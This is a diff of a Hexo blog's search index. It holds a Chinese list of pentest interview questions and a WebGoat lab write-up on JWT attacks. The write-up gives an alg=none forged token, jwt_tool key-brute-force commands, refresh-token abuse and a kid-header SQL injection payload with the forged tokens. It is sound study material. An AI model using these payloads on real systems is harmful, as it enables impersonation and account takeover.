@@ -56,11 +56,11 @@
     
     
     <entry>
-      <title>一次长亭面经，路还很长</title>
-      <link href="/2021/05/28/%E4%B8%80%E6%AC%A1%E9%95%BF%E4%BA%AD%E9%9D%A2%E7%BB%8F%EF%BC%8C%E8%B7%AF%E8%BF%98%E5%BE%88%E9%95%BF/"/>
-      <url>/2021/05/28/%E4%B8%80%E6%AC%A1%E9%95%BF%E4%BA%AD%E9%9D%A2%E7%BB%8F%EF%BC%8C%E8%B7%AF%E8%BF%98%E5%BE%88%E9%95%BF/</url>
+      <title>一次长亭面经_路还很长</title>
+      <link href="/2021/05/28/%E4%B8%80%E6%AC%A1%E9%95%BF%E4%BA%AD%E9%9D%A2%E7%BB%8F_%E8%B7%AF%E8%BF%98%E5%BE%88%E9%95%BF/"/>
+      <url>/2021/05/28/%E4%B8%80%E6%AC%A1%E9%95%BF%E4%BA%AD%E9%9D%A2%E7%BB%8F_%E8%B7%AF%E8%BF%98%E5%BE%88%E9%95%BF/</url>
       
-        <content type="html"><![CDATA[<ol><li>印象深刻的一次漏洞挖掘。可以说说攻防项目里所做的事情。</li><li>是否接触过做过红队。</li><li>最近在做什么类型的项目。</li><li>最近在学习什么方向的内容。</li><li>sql注入的类型。常用的注入方法。</li><li>绕过根据语义解析恶意字符的waf的方法。</li><li>报错注入的函数有哪些。</li><li>已经拿下webshell，是mysql数据库，要往里写文件除了要知道物理路径还需要什么条件。</li><li>mysql高版本和低版本的利用方式有哪些差别。</li><li>延时注入mysql数据库除了sleep()还有什么函数可以实现。</li><li>sqlserver提权除了xp_cmdshell组件还有什么方法。</li><li>注入的修复方式。</li><li>mybase数据库预编译时占位符是什么。</li><li>xss原理。</li><li>dom xss原理，具体怎么实现的。</li><li>在开启了httponly的情况下，怎么去利用xss。</li><li>在进行命令执行等攻击的时候页面上没有回显怎么办，假如不能出网的话又该怎么办。</li><li>redis主从复制漏洞的这个主从复制原理是什么。</li><li>csrf修复的方式。</li><li>假如csrf加入了referer头验证，怎么去绕过。</li><li>shiro的漏洞都有复现过吗。</li><li>shiro不同版本之间的漏洞它们本质上的区别是什么。</li><li>shiro反序列化漏洞利用的加密算法是什么。</li><li>shiro反序列化漏洞的原理，处理cookie的流程。</li><li>高版本的shiro用的什么加解密模式。</li><li>mimikatz是从系统的什么进程中读的hash。</li><li>假如读取的hash没有暴破出来该怎么办。</li><li>pth研究过没有。</li><li>ntlm协议的认证流程。</li><li>liunx权限维持有哪些方法。</li><li>linux提权的方法有哪些。</li><li>代码审计做过哪些项目，java的代审有接触过吗。</li><li>php文件包含用的函数名称。</li><li>利用php写的cms漏洞研究过哪些。</li><li>应急响应有做过哪些项目，详细的需要检查什么配置。</li><li>3389登录成功日志的ID是多少。</li><li>内存马的具体排查流程，溯源的流程。</li><li>安卓测试的项目做过没。</li><li>怎么脱壳。</li><li>一般怎么进行安卓的测试。</li></ol>]]></content>
+        <content type="html"><![CDATA[<ol><li>印象深刻的一次漏洞挖掘。可以说说攻防项目里所做的事情。</li><li>是否接触过做过红队。</li><li>最近在做什么类型的项目。</li><li>最近在学习什么方向的内容。</li><li>SQL注入的类型。常用的注入方法。</li><li>绕过根据语义解析恶意字符的waf的方法。</li><li>报错注入的函数有哪些。</li><li>已经拿下Webshell，是MySQL数据库，要往里写文件除了要知道物理路径还需要什么条件。</li><li>MySQL高版本和低版本的利用方式有哪些差别。</li><li>延时注入MySQL数据库除了SLEEP()还有什么函数可以实现。</li><li>SQLServer提权除了XP_CMDSHELL组件还有什么方法。</li><li>注入的修复方式。</li><li>Mybatis数据库预编译时占位符是什么。</li><li>XSS原理。</li><li>Dom XSS原理，具体怎么实现的。</li><li>在开启了Httponly的情况下，怎么去利用XSS。</li><li>在进行命令执行等攻击的时候页面上没有回显怎么办，假如不能出网的话又该怎么办。</li><li>Redis主从复制漏洞的这个主从复制原理是什么。</li><li>CSRF修复的方式。</li><li>假如CSRF加入了Referer头验证，怎么去绕过。</li><li>Shiro的漏洞都有复现过吗。</li><li>Shiro不同版本之间的漏洞它们本质上的区别是什么。</li><li>Shiro反序列化漏洞利用的加密算法是什么。</li><li>Shiro反序列化漏洞的原理，处理Cookie的流程。</li><li>高版本的Shiro用的什么加解密模式。</li><li>Mimikatz是从系统的什么进程中读的Hash。</li><li>假如读取的Hash没有暴破出来该怎么办。</li><li>PTH研究过没有。</li><li>NTLM协议的认证流程。</li><li>Liunx权限维持有哪些方法。</li><li>Linux提权的方法有哪些。</li><li>代码审计做过哪些项目，Java的代审有接触过吗。</li><li>PHP文件包含用的函数名称。</li><li>利用PHP写的CMS漏洞研究过哪些。</li><li>应急响应有做过哪些项目，详细的需要检查什么配置。</li><li>3389登录成功日志的ID是多少。</li><li>内存马的具体排查流程，溯源的流程。</li><li>安卓测试的项目做过没。</li><li>怎么脱壳。</li><li>一般怎么进行安卓的测试。</li></ol>]]></content>
       
       
       <categories>
@@ -211,9 +211,9 @@
             
             <tag> 票据 </tag>
             
-            <tag> 委派 </tag>
-            
             <tag> Kerberos </tag>
+            
+            <tag> 委派 </tag>
             
         </tags>
       
@@ -267,11 +267,11 @@
             
             <tag> 票据 </tag>
             
+            <tag> Hash </tag>
+            
             <tag> 后门 </tag>
             
             <tag> 令牌 </tag>
-            
-            <tag> Hash </tag>
             
         </tags>
       
@@ -280,16 +280,16 @@
     
     
     <entry>
-      <title>JWT漏洞的学习</title>
-      <link href="/2021/02/24/JWT%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
-      <url>/2021/02/24/JWT%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+      <title>JWT漏洞</title>
+      <link href="/2021/02/24/JWT%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2021/02/24/JWT%E6%BC%8F%E6%B4%9E/</url>
       
         <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>JWT全称Json Web Token，是一种无状态的跨域身份验证令牌。服务端会对客户端提交的信息进行签名生成token，用于之后维持会话状态，服务端本身不存储用户状态信息。</p><p>解码网站：<a href="https://jwt.io/">https://jwt.io/</a></p><p><strong>分类</strong></p><p>access token：用户授权令牌，存在有效期，过期需要用refresh token刷新，认证成功后存储在客户端，无状态。</p><p>refresh token：用来刷新access token，有效期很长，一般保存在服务端数据库中。</p><h1 id="access-token结构"><a href="#access-token结构" class="headerlink" title="access token结构"></a><strong>access token结构</strong></h1><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224105031.png"></p><p><strong>header</strong></p><p>存放签名算法。以base64UrlEncode(header)形式存放。</p><p>ps：base64Url编码以base64为基础，替换+和/为_，去除尾部=。更为安全。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">    <span class="attr">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>claims</strong></p><p>传输的数据以及一些固定参数。以base64UrlEncode(payload)形式存放。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">    <span class="attr">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;iat&quot;</span>: <span class="number">1524210904</span>,  </span><br><span class="line">    <span class="attr">&quot;exp&quot;</span>: <span class="number">1618905304</span>,  </span><br><span class="line">    <span class="attr">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;username&quot;</span>: <span class="string">&quot;Jerry&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;Email&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,  </span><br><span class="line">    <span class="attr">&quot;Role&quot;</span>: [   </span><br><span class="line">        <span class="string">&quot;Cat&quot;</span>  </span><br><span class="line">    ] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一些固定参数：</p><ul><li>iss：发行人</li><li>iat：发布时间</li><li>exp：到期时间</li><li>aud：用户</li><li>sub：主题</li><li>nbf：生效时间</li><li>jti：JWT编号</li></ul><p><strong>signature</strong></p><p>采用header中指定的算法以及自定义密钥对header和claims签名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">    base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +  </span><br><span class="line">    base64UrlEncode(payload),  </span><br><span class="line">    your-<span class="number">256</span>-bit-secret </span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="JWT会话流程"><a href="#JWT会话流程" class="headerlink" title="JWT会话流程"></a><strong>JWT会话流程</strong></h1><ol><li>客户端将用户名和密码发给服务端。</li><li>验证成功后生成JWT返回给客户端，包括有效时间较短的access token和有效时间较长的refresh token。</li><li>客户端在下次会话时将access token写在请求头的Authorization字段中发给服务端。</li><li>若access token未过期，服务端验证JWT，成功后返回响应，确认用户登录。</li><li>若access token过期，客户端访问刷新接口，携带access token和refresh token。</li><li>若refresh token没有过期，服务端验证通过后生成新的access token返回给客户端，若过期则生成新的refresh token保存并下发。</li></ol><h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a><strong>攻击方法</strong></h1><ol><li>alg设置none绕过签名。</li><li>暴破密钥重建token。</li><li>利用refresh token刷新他人access token。</li><li>头字段注入。</li></ol><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h1><p>搭建环境。</p><p><a href="https://github.com/WebGoat/WebGoat/">https://github.com/WebGoat/WebGoat/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8080:8080 -p 9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf</span><br></pre></td></tr></table></figure><p><a href="http://172.16.1.5:8080/WebGoat/login">http://172.16.1.5:8080/WebGoat/login</a></p><h2 id="alg设置none绕过签名"><a href="#alg设置none绕过签名" class="headerlink" title="alg设置none绕过签名"></a><strong>alg设置none绕过签名</strong></h2><p>第四关。</p><p>直接清除权限不够。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224105539.png"></p><p>解码得：</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224105547.png"></p><p>修改后得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;&#125;  =&gt;  eyJhbGciOiJub25lIn0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;iat&quot;:1614691419,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;   =&gt;   eyJpYXQiOjE2MTQ2OTE0MTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ</span><br></pre></td></tr></table></figure><p>拼接后得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE2MTQ2OTE0MTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</span><br></pre></td></tr></table></figure><p>注意最后的点。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110421.png"></p><p>用jwt_tool可以扫描。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MTQ2NjkzMDIsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.kuAXUbVdbd13DjJKQ-XtIzXLU22It4sW3Bw8z0yyZgJu_G8y55gK8pkJ0azIHDJtmzSAP5cuO6ghS-jeBimdhw -X a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110518.png"></p><h2 id="暴破密钥重建token"><a href="#暴破密钥重建token" class="headerlink" title="暴破密钥重建token"></a>暴破密钥重建token</h2><p>第五关。  </p><p>根据提示的token解码得到：</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110651.png"></p><p>暴破密钥，字典需自己构建。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py eyJhbGcioiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMzgzMDIyNiwiZXhwIjoxNjEzODMwMjg2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19._c6gzZwVGp6Y1rq5-j6k3FGOdVcXLix7inM1aCc3XwE -C -d pass.txt</span><br></pre></td></tr></table></figure><p>得到：victory。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110715.png"></p><p>修改token到期时间以及username后重新签名提交即可。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110747.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224110754.png"></p><h2 id="利用refresh-token刷新他人access-token"><a href="#利用refresh-token刷新他人access-token" class="headerlink" title="利用refresh token刷新他人access token"></a>利用refresh token刷新他人access token</h2><p>第七关。</p><p>根据提示，tom的access token已过期。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111128.png"></p><p>访问登录接口登录jerry，获取token。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111220.png"></p><p>现在有了tom过期的access token，可以拿刚申请的jerry的refresh token刷新。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111300.png"></p><p>得到tom新的access token。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111355.png"></p><p>拿新的token去付款，ok。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111404.png"></p><h2 id="头字段注入"><a href="#头字段注入" class="headerlink" title="头字段注入"></a>头字段注入</h2><p>第八关，kid字段存在注入。</p><p>根据提示获取jerry的access token。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111631.png"></p><p>只会常规方法，菜鸡不知所措。</p><p>参考大佬白盒审计。kid没有任何过滤就带入数据库。此处key就是JWT签名的密钥。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111706.png"></p><p>构造payload，联合查询指定自定义密钥。源码里查询结果会先base64解码，NjY2为666编码后的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT key FROM jwt_keys WHERE id = &#x27;&#x27; union select &#x27;NjY2&#x27; FROM jwt_keys where id=&#x27;webgoat_key</span><br></pre></td></tr></table></figure><p>这种也行，讲道理from后写任意存在表名即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION select &#x27;NjY2&#x27; from INFORMATION_SCHEMA.SCHEMATA--+</span><br></pre></td></tr></table></figure><p>带入kid，把username改成Tom，得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJraWQiOiInIHVuaW9uIHNlbGVjdCAnTmpZMicgRlJPTSBqd3Rfa2V5cyB3aGVyZSBpZD0nd2ViZ29hdF9rZXkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.fODOsXyyKNIjvBiUULq6_QIg-uRGICKgIWNYT3Rbez4</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111737.png"></p><p>ok。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224111755.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://zhuanlan.zhihu.com/p/69531279">https://zhuanlan.zhihu.com/p/69531279</a></p><p><a href="https://www.cnblogs.com/Secde0/p/13968608.html">https://www.cnblogs.com/Secde0/p/13968608.html</a></p>]]></content>
       
       
       <categories>
           
-          <category> web安全 </category>
+          <category> Web安全 </category>
           
       </categories>
       
@@ -539,9 +539,9 @@
       
         <tags>
             
-            <tag> 域名 </tag>
-            
             <tag> 信息收集 </tag>
+            
+            <tag> 域名 </tag>
             
         </tags>
       
@@ -591,11 +591,11 @@
       
         <tags>
             
+            <tag> 反弹Shell </tag>
+            
             <tag> 端口 </tag>
             
             <tag> 代理 </tag>
-            
-            <tag> 反弹Shell </tag>
             
         </tags>
       
@@ -620,9 +620,9 @@
       
         <tags>
             
-            <tag> SPN </tag>
-            
             <tag> Kerberos </tag>
+            
+            <tag> SPN </tag>
             
         </tags>
       
@@ -672,9 +672,9 @@
       
         <tags>
             
-            <tag> NTLM </tag>
-            
             <tag> Hash </tag>
+            
+            <tag> NTLM </tag>
             
         </tags>
       
@@ -848,11 +848,11 @@
       
         <tags>
             
-            <tag> SAM </tag>
-            
             <tag> Hash </tag>
             
             <tag> Lsass </tag>
+            
+            <tag> SAM </tag>
             
         </tags>
       
